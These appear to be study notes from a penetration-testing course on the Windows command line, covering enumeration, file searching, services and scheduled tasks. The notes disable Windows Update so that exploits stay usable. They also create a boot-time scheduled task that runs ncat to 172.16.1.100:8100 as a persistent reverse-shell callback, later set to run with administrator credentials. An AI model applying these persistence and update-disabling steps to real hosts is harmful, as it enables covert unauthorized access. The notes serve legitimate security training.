# Windows Command-Line

## CMD

`find / -name cmd.exe 2>/dev/null`:
```powershell
Get-ChildItem -Recurse C:\ -Filter cmd.exe
```


`ifconfig`:
```cmd
ipconfig /all
```

`clear`:
```cmd
cls
```

`neofetch`
```cmd
systeminfo
```

`cat ~/.bash_history`:
```
doskey /history
```

```
mkdir
dir
cd
rmdir
move
xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E /K  # deprecated, /E is to copy empty directories, /K is to preserve file attributes
robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\
more
type    # cat
openfiles   # show open files. requires admin
type passwords.txt >> secrets.txt
echo Check this out > demo.txt
echo More text for our demo file >> demo.txt
ren demo.txt superdemo.txt      # rename file
find    # in CMD, find is like grep
ipconfig /all | find /i "ipv4
ping 8.8.8.8 & type test.txt    # here '&' is like ';' in UNIX
ping 8.8.8.8 && type test.txt    # here '&&' is equal to '&&' in UNIX
del  # or erase, is rm in UNIX
copy    # is like cp
move    # is like mv
whoami
```

### Gathering System Information

Below is a chart that outlines the main types of information to be aware.

<img src="fig/InformationTypesChart_Updated.png" style="background-color: #1a2332;">

---

* Obtain system information:

```
C:\htb> systeminfo

Host Name:                 DESKTOP-htb
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free

C:\htb> hostname

DESKTOP-htb

C:\htb> ver

Microsoft Windows [Version 10.0.19042.2006]
```

* Obtain network information
```
C:\htb> ipconfig

Windows IP Configuration

<SNIP>

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : htb.local
   Link-local IPv6 Address . . . . . : fe80::2958:39a:df51:b60%23
   IPv4 Address. . . . . . . . . . . : 10.0.25.17
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.25.1

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : internal.htb.local
   Link-local IPv6 Address . . . . . : fe80::bc3b:6f9f:68d4:3ec5%26
   IPv4 Address. . . . . . . . . . . : 172.16.50.15
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.50.1
```

* Find additional hosts with `arp`:
```
C:\htb> arp /a

Interface: 10.0.25.17 --- 0x17
  Internet Address      Physical Address      Type
  10.0.25.1             00-e0-67-15-cf-43     dynamic
  10.0.25.5             54-9f-35-1c-3a-e2     dynamic
  10.0.25.10            00-0c-29-62-09-81     dynamic
  10.0.25.255           ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.16.50.15 --- 0x1a
  Internet Address      Physical Address      Type
  172.16.50.1           15-c0-6b-58-70-ed     dynamic
  172.16.50.20          80-e5-53-3c-72-30     dynamic
  172.16.50.32          fb-90-01-5c-1f-88     dynamic
  172.16.50.65          7a-49-56-10-3b-76     dynamic
  172.16.50.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static\
```

From this example, we can see all the hosts that have come into contact or might have had some prior communication with our target. We can use this information to begin mapping the network along each of the networking interfaces belonging to our target.

* Understanding our current user
```
C:\htb> whoami

ACADEMY-WIN11\htb-student
```

As we can see from the initial output above, running whoami without parameters provides us with the current domain and the user name of the logged-in account. If the current user is not a domain-joined account, the NetBIOS name will be provided instead. The current hostname will be used in most cases.

* Checking out our privileges
```
C:\htb> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

* Investigating groups
```
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

* Investigating other users/groups
```
C:\htb> net user

User accounts for \\ACADEMY-WIN11

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
htb-student              WDAGUtilityAccount
The command completed successfully.
```

* Net group / localgroup

Net Group will display any groups that exist on the host from which we issued the command, create and delete groups, and add or remove users from groups. It will also display domain group information if the host is joined to the domain. Keep in mind, `net group` must be run against a domain server such as the DC, while `net localgroup` can be run against any host to show us the groups it contains.

```
C:\htb> net group
net group
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.


C:\htb>net localgroup

Aliases for \\ACADEMY-WIN11

-------------------------------------------------------------------------------
*__vmware__
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.
```

* Exploring Resources on the Network

In a domain environment, users are typically required to store any work-related material on a share located on the network versus storing files locally on their machine. These shares are usually found on a server away from the physical access of a run-of-the-mill employee. Typically, standard users will have the necessary permissions to read, write, and execute files from a share, provided they have valid credentials.

Net Share allows us to display info about shared resources on the host and to create new shared resources as well.
```
C:\htb> net share  

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Records      D:\Important-Files              Mounted share for records storage  
The command completed successfully.
```

In addition to providing information, `shares` are great for hosting anything we need and laterally moving across hosts as a pentester. If we are not too worried about being sneaky, we can drop a payload or other data onto a share to enable movement around other hosts on the network. Although outside of the scope of this module, abusing shares in this manner is an excellent persistence method and can potentially be used to escalate privileges.

* Net View

**Net View** will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.
```
C:\htb> net view
```

> Note: In a standard environment, cmd-prompt usage is not a common thing for a regular user. Administrators sometimes have a reason to use it but will be actively suspicious of any average user executing cmd.exe. With that in mind, using net * commands within an environment is not a normal thing either, and can be one way to alert on potential infiltration of a networked host easily. With proper monitoring and logging enabled, we should spot these actions quickly and use them to triage an incident before it gets too far out of hand.


### Finding Files and Directories

* Searching with CMD

```
C:\Users\student\Desktop>where calc.exe

C:\Windows\System32\calc.exe

C:\Users\student\Desktop>where bio.txt

INFO: Could not find files for the given pattern(s).
```

First, we searched for `calc.exe`. This command worked because the system32 folder is in our environment variable path, so the `where` command can look through those folders automatically.

The second attempt we see failed. This is because we are searching for a file that does not exist within that environment path. It is located within our user directory. So we need to specify the path to search in, and to ensure we dig through all directories within that path, we can use the `/R` switch.

* Recursive Where

```
C:\Users\student\Desktop>where /R C:\Users\student\ bio.txt

C:\Users\student\Downloads\bio.txt
```

* Using Wildcards

Above, we searched recursively, looking for `bio.txt`. The file was found in the `C:\Users\student\Downloads\` folder. The `/R` switch forced the where command to search through every folder in the student user directory hive. On top of looking for files, we can also search wildcards for specific strings, file types, and more. Below is an example of searching for the csv file type within the student directory.

```
C:\Users\student\Desktop>where /R C:\Users\student\ *.csv

C:\Users\student\AppData\Local\live-hosts.csv
```

* Basic Find

```
C:\Users\student\Desktop> find "password" "C:\Users\student\not-passwords.txt" 
```

* Find Modifiers

We can modify the way `find` searches using several switches. The `/V` modifier can change our search from a matching clause to a `Not` clause. So, for example, if we use `/V` with the search string password against a file, it will show us any line that does not have the specified string. We can also use the `/N` switch to display line numbers for us and the `/I` display to ignore case sensitivity. In the example below, we use all of the modifiers to show us any lines that do not match the string **IP Address** while asking it to display line numbers and ignore the case of the string.

* Findstr

For quick searches, `find` is easy to use, but it could be more robust in how it can search. However, if we need something more specific, `findstr` is what we need. The `findstr` command is similar to `find` in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. Think of it as find2.0. For those familiar with Linux, `findstr` is closer to `grep`.
```
C:\Users\student\Desktop> findstr
```

#### Evaluating and Sorting Files

* Compare

`Comp` will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the `/A` modifier if we want to see the differences in ASCII format. The `/L` modifier can also provide us with the line numbers.
```
C:\Users\student\Desktop> comp .\file-1.md .\file-2.md

Comparing .\file-1.md and .\file-2.md...
Files compare OK  
```

* FC

**FC** differs in that it will show you which lines are different, not just an individual character (`/A`) or byte that is different on each line. FC has quite a few more options than Comp has, so be sure to look at the help output to ensure you are using it in the manner you want.

```
C:\Users\student\Desktop> fc passwords.txt modded.txt /N

Comparing files passwords.txt and MODDED.TXT
***** passwords.txt
    1:  123456
    2:  password
***** MODDED.TXT
    1:  123456
    2:
    3:  password
*****

***** passwords.txt
    5:  12345
    6:  qwerty
***** MODDED.TXT
    6:  12345
    7:  Just something extra to show functionality. Did it see the space inserted above?
    8:  qwerty
*****

```

The output from FC is much easier to interpret and gives us a bit more clarity about the differences between the files.

* Sort

With **Sort**, we can receive input from the console, pipeline, or a file, sort it and send the results to the console or into a file or another command. It is relatively simple to use and often will be used in conjunction with pipeline operators such as `|`, `<`, and `>`.
```
C:\Users\student\Desktop> type .\file-1.md
a
b
d
h
w
a
q
h
g

C:\Users\MTanaka\Desktop> sort.exe .\file-1.md /O .\sort-1.md
C:\Users\MTanaka\Desktop> type .\sort-1.md

a
a
b
d
g
h
h
q
w
```

We could also use the `/unique` modifier to only display unique lines in sorted order.
```
C:\htb> type .\sort-1.md

a
a
b
d
g
h
h
q
w

PS C:\Users\MTanaka\Desktop> sort.exe .\sort-1.md /unique

a
b
d
g
h
q
w  
```

### Environment Variables

Environment variables on Windows are called like so:
```
%SUPER_IMPORTANT_VARIABLE%
```

* Showcasing environment variables
```cmd
echo %SUPER_IMPORTANT_VARIABLE%
```

* Set local environment variable (Current command line session)
```cmd
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
```

* Set global environment variable (Available on a next session)
```cmd
setx SECRET HTB{5UP3r_53Cr37_V4r14813}
```

* Scope of variables

Scope | Permissions Required to Access | Registry Location
----- | ------------------------------ | -----------------
`System (Machine)` | Local Administrator or Domain Administrator | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`
`User` | Current Active User, Local Administrator, or Domain Administrator | `HKEY_CURRENT_USER\Environment`
`Process` | Current Child Process, Parent Process, or Current Active User | `None (Stored in Process Memory)`


* Important environment variables

Variable Name | Description
------------- | -----------
%PATH% | Specifies a set of directories(locations) where executable programs are located.
%OS% | The current operating system on the user's workstation.
%SYSTEMROOT% | Expands to C:\Windows. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.
%LOGONSERVER% | Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.
%USERPROFILE% | Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}.
%ProgramFiles% | Equivalent of C:\Program Files. This location is where all the programs are installed on an x64 based system.
%ProgramFiles(x86)% | Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)


### Managing Services

#### Service Controller

SC is a Windows executable utility that allows us to query, modify, and manage host services locally and over the network.

```
C:\htb> sc  

DESCRIPTION:
        SC is a command line program used for communicating with the
        Service Control Manager and services.
USAGE:
        sc <server> [command] [service name] <option1> <option2>...


        The option <server> has the form "\\ServerName"
        Further help on commands can be obtained by typing: "sc [command]"
        Commands:
          query-----------Queries the status for a service, or
                          enumerates the status for types of services.
          queryex---------Queries the extended status for a service, or
                          enumerates the status for types of services.
          start-----------Starts a service.
          pause-----------Sends a PAUSE control request to a service.

<SNIP>  

SYNTAX EXAMPLES
sc query                - Enumerates status for active services & drivers
sc query eventlog       - Displays status for the eventlog service
sc queryex eventlog     - Displays extended status for the eventlog service
sc query type= driver   - Enumerates only active drivers
sc query type= service  - Enumerates only Win32 services
sc query state= all     - Enumerates all services & drivers
sc query bufsize= 50    - Enumerates with a 50 byte buffer
sc query ri= 14         - Enumerates with resume index = 14
sc queryex group= ""    - Enumerates active services not in a group
sc query type= interact - Enumerates all interactive services
sc query type= driver group= NDIS     - Enumerates all NDIS drivers
```

> **Note:** The spacing for the optional query parameters is crucial. For example, `type= service`, `type=service`, and `type =service` are completely different ways of spacing this parameter. However, only `type= service` is correct in this case.

```
C:\htb> sc query type= service

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: Audiosrv
DISPLAY_NAME: Windows Audio
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: BFE
DISPLAY_NAME: Base Filtering Engine
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

<SNIP>
```

* Querying for Windows Defender

```
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

We can tell that Windows Defender is running and, with our current permission set (the one in which we utilized for the query), does not have permission to stop or pause the service (likely because our user is a standard user and not an administrator). We can test this by trying to stop the service.

#### Stopping and Starting Services

* Stopping an Elevated Service

```
C:\htb> sc stop windefend

Access is denied.  
```

Ideally, attempting to stop an elevated service like this is not the best way of testing permissions, as this will likely lead to us getting caught due to the traffic that will be kicked up from running a command like this.

* Stopping an Elevated Service as Administrator

```
C:\WINDOWS\system32> sc stop windefend

Access is denied.
```

It seems we still do not have the proper access to stop this service in particular. This is a good lesson for us to learn, as certain processes are protected under stricter access requirements than what local administrator accounts have. In this scenario, the only thing that can stop and start the Defender service is the **SYSTEM** machine account.

Moving on, let's find ourselves a service we can take out as an Administrator. The good news is that we can stop the Print Spooler service.

* Finding the Print Spooler Service

```
C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

* Stopping the Print Spooler Service

```
C:\WINDOWS\system32> sc stop Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x4e20

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

As stated above, we can issue the command sc stop Spooler to have Windows issue a STOP control request to the service. It is important to note that not all services will respond to these requests, regardless of our permissions, especially if other running programs and services depend on the service we are attempting to stop.

* Starting the Print Spooler Service

```
C:\WINDOWS\system32> sc start Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 34908
        FLAGS              :

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

#### Modifying Services

Let's go ahead and see if we can modify some services to prevent Windows from updating itself.

* Disabling Windows Updates Using SC

To configure services, we must use the `config` parameter in sc. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (**SCM**). Remember that all changes to existing services will only fully update after restarting the service.

Unfortunately, the Windows Update feature (Version 10 and above) does not just rely on one service to perform its functionality. Windows updates rely on the following services:
Service | Display Name
------- | ------------
wuauserv | Windows Update Service
bits | Background Intelligent Transfer Service

> Important: The scenario below requires access to a privileged account. Making updates to services will typically require a set of higher permissions than a regular user will have access to.

* Checking the State of the Required Services

```
C:\WINDOWS\system32> sc query wuauserv

SERVICE_NAME: wuauserv
        TYPE               : 30  WIN32
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\WINDOWS\system32> sc query bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

From the information provided above, we can see that the `wuauserv` service is not currently active as the system is not currently in the process of updating. However, the `bits` service (required to download updates) is currently running on our system. We can issue a stop to this service using our knowledge from the prior section by doing the following:

* Stopping BITS

```
C:\WINDOWS\system32> sc stop bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x0
```

After ensuring that both services are currently stopped, we can modify the **start type** of both services.

* Disabling Windows Update Service
```
C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS
```

* Disabling Background Intelligent Transfer Service
```
C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS
```

We can see the confirmation that both services have been modified successfully. This means that when both services attempt to start, they will be unable to as they are currently disabled. As previously mentioned, this change will persist upon reboot, meaning that when the system attempts to check for updates or update itself, it cannot do so because both services will remain disabled. We can verify that both services are indeed disabled by attempting to start them.

* Verifying Services are Disabled

```
C:\WINDOWS\system32> sc start wuauserv 

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

C:\WINDOWS\system32> sc start bits

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
```

> Note: To revert everything back to normal, you can set `start= auto` to make sure that the services can be restarted and function appropriately.

We have verified that both services are now disabled, as we cannot start them manually. Due to the changes made here, Windows cannot utilize its updating feature to provide any system or security updates. This can be very beneficial to an attacker to ensure that a system can remain out of date and not retrieve any updates that would inhibit the usage of certain exploits on a target system. Be aware that by doing this in this manner, we will likely be triggering alerts for this sort of action set up by the resident blue team. This method is not quiet and does require elevated permissions in a lot of cases to perform.

#### Other Routes to Query Services

* Using Tasklist

Tasklist is a command line tool that gives us a list of currently running processes on a local or remote host. However, we can utilize the `/svc` parameter to provide a list of services running under each process on the system.
```
C:\htb> tasklist /svc


Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       108 N/A
smss.exe                       412 N/A
csrss.exe                      612 N/A
wininit.exe                    684 N/A
csrss.exe                      708 N/A
services.exe                   768 N/A
lsass.exe                      796 KeyIso, SamSs, VaultSvc
winlogon.exe                   856 N/A
svchost.exe                    984 BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power, SystemEventsBroker
fontdrvhost.exe               1012 N/A
fontdrvhost.exe               1020 N/A
svchost.exe                    616 RpcEptMapper, RpcSs
svchost.exe                    996 LSM
dwm.exe                       1068 N/A
svchost.exe                   1236 CoreMessagingRegistrar
svchost.exe                   1244 lmhosts
svchost.exe                   1324 NcbService
svchost.exe                   1332 TimeBrokerSvc
svchost.exe                   1352 Schedule
<SNIP>
```

* Using Net Start

**Net start** is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to `net start`, there is also `net stop`, `net pause`, and `net continue`. These will behave very similarly to `sc` as we can provide the name of the service afterward and be able to perform the actions specified in the command against the service that we provide.
```
C:\htb> net start

These Windows services are started:

   Application Information
   AppX Deployment Service (AppXSVC)
   AVCTP service
   Background Tasks Infrastructure Service
   Base Filtering Engine
   BcastDVRUserService_3321a
   Capability Access Manager Service
   cbdhsvc_3321a
   CDPUserSvc_3321a
   Client License Service (ClipSVC)
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected User Experiences and Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   Data Usage
   DCOM Server Process Launcher
   Delivery Optimization
   Device Association Service
   DHCP Client
   <SNIP>
```

* Using WMIC

The Windows Management Instrumentation Command (`WMIC`) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information. However, we will only be going over a very small subset of the functionality provided by the `SERVICE` component residing inside this application.
```
C:\htb> wmic service list brief

ExitCode  Name                                      ProcessId  StartMode  State    Status
1077      AJRouter                                  0          Manual     Stopped  OK
1077      ALG                                       0          Manual     Stopped  OK
1077      AppIDSvc                                  0          Manual     Stopped  OK
0         Appinfo                                   5016       Manual     Running  OK
1077      AppMgmt                                   0          Manual     Stopped  OK
1077      AppReadiness                              0          Manual     Stopped  OK
1077      AppVClient                                0          Disabled   Stopped  OK
0         AppXSvc                                   9996       Manual     Running  OK
1077      AssignedAccessManagerSvc                  0          Manual     Stopped  OK
0         AudioEndpointBuilder                      2076       Auto       Running  OK
0         Audiosrv                                  2332       Auto       Running  OK
1077      autotimesvc                               0          Manual     Stopped  OK
1077      AxInstSV                                  0          Manual     Stopped  OK
1077      BDESVC                                    0          Manual     Stopped  OK
0         BFE                                       2696       Auto       Running  OK
0         BITS                                      0          Manual     Stopped  OK
0         BrokerInfrastructure                      984        Auto       Running  OK
1077      BTAGService                               0          Manual     Stopped  OK
0         BthAvctpSvc                               4448       Manual     Running  OK
1077      bthserv                                   0          Manual     Stopped  OK
0         camsvc                                    5676       Manual     Running  OK
0         CDPSvc                                    4724       Auto       Running  OK
1077      CertPropSvc                               0          Manual     Stopped  OK
0         ClipSVC                                   9156       Manual     Running  OK
1077      cloudidsvc                                0          Manual     Stopped  OK
0         COMSysApp                                 3668       Manual     Running  OK
0         CoreMessagingRegistrar                    1236       Auto       Running  OK
0         CryptSvc                                  2844       Auto       Running  OK
<SNIP>
```

> Note: It is important to be aware that the WMIC command-line utility is currently deprecated as of the current Windows version. As such, it is advised against relying upon using the utility in most situations.

#### Working With Scheduled Tasks

* Display Scheduled Tasks: Query Syntax

| Action | Parameter | Description
| ------ | ---------  | -----------
| Query | | Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.
|  | /fo | Sets formatting options. We can specify to show results in the Table, List, or CSV output.
|  | /v | Sets verbosity to on, displaying the advanced properties set in displayed tasks when used with the List or CSV output parameter.
|  | /nh | Simplifies the output using the Table or CSV output format. This switch removes the column headers.
|  | /s | Sets the DNS name or IP address of the host we want to connect to. Localhost is the default specified. If /s is utilized, we are connecting to a remote host and must format it as "\\host".
|  | /u | This switch will tell schtasks to run the following command with the permission set of the user specified.
|  | /p | Sets the password in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The u and p values are only valid when used with the s parameter.

We can view the tasks that already exist on our host by utilizing the schtasks command like so:
```
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

* Create a New Scheduled Task: Create Syntax

| Action | Parameter | Description
| ------ | --------- | -----------
| Create | | Schedules a task to run.
| | /sc | Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.
| | /tn | Sets the name for the task we are building. Each task must have a unique name.
| | /tr | Sets the trigger and task that should be run. This can be an executable, script, or batch file.
| | /s | Specify the host to run on, much like in Query.
| | /u | Specifies the local user or domain user to utilize
| | /p | Sets the Password of the user-specified.
| | /mo | Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.
| | /rl | Allows us to limit the privileges of the task. Options here are limited access and Highest. Limited is the default value.
| | /z | Will set the task to be deleted after completion of its actions.


At a minimum, we must specify the following:

* `/create`: to tell it what we are doing
* `/sc`: we must set a schedule
* `/tn`: we must set the name
* `/tr`: we must give it an action to take

```
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

> A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.

* Change the Properties of a Scheduled Task: Change Syntax

| Action | Parameter | Description
| ----- | ----- | -----
| Change | | Allows for modifying existing scheduled tasks.
| | /tn | Designates the task to change
| | /tr | Modifies the program or action that the task runs.
| | /ENABLE | Change the state of the task to Enabled.
| | /DISABLE | Change the state of the task to Disabled.

Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.
```
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

```
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
